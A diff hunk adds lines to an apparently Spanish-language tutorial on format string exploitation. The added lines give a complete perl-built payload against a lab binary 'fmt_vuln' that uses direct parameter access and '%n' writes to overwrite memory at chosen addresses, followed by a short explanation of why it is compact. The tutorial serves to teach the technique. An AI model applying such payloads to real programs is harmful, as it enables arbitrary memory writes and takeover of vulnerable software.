@@ -230,6 +230,12 @@
    string, utiliza el min-width con (%nnnx) de los "JUNK" entre cada direccion. Esto permite que el format
    string sea chica, a pesar de imprimir una cantidad grande de caracteres.
 
+   ~$ ./fmt_vuln $(perl -e 'print "\xd0\x98\x04\x08\xd1\x98\x04\x08\xd2\x98\x04\x08\xd3\x98\x04\x08"."%98x"')'%4$n%1$139x%5$n%1$258x%6$n%1$192x%7$n'~
+   Este ultimo ejemplo usa 58 bytes. Emplea "direct parameters" para utilizar directamente el parametro
+   indicado por "n$". Eso hace innecesaros los "JUNK" y los "%100x" entre las address para ir aumentando
+   los bytes escritos
+
+
     
 
     
